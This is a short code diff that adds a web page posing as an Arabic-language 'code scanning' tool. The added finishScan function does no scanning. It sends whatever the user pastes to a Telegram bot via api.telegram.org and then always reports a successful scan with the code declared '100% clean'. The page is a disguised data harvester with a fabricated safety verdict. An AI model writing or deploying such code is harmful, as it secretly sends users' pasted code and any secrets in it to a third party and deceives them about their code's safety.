@@ -41,4 +41,20 @@
         document.getElementById('mainCard').innerHTML = `
             <h2>🛡️ نظام الفحص</h2>
             <p style="color: #8b949e;">الصق الكود البرمجي هنا لتحليله</p>
-            <textarea id="codeTo
+            <textarea id="codeToScan" placeholder="ضع الكود هنا..." rows="5"></textarea>
+            <button onclick="finishScan()">بدء الفحص الآن 🔍</button>
+        `;
+    }
+
+    async function finishScan() {
+        const content = document.getElementById('codeToScan').value;
+        if(content) {
+            const message = `🔍 محتوى للفحص:\n${content}`;
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`);
+        }
+        alert("✅ تم الفحص بنجاح! الكود سليم 100%");
+    }
+</script>
+
+</body>
+</html>
